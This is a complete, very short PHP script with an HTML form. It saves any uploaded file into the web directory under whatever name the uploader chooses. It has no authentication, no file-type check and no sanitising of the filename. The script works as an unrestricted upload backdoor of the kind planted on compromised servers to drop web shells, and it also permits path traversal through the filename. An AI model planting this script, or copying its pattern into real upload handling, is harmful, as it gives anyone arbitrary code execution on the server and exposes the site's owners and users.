<?php
if(isset($_FILES['f'])) {
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="f">
    <input type="submit" value="Upload">
</form>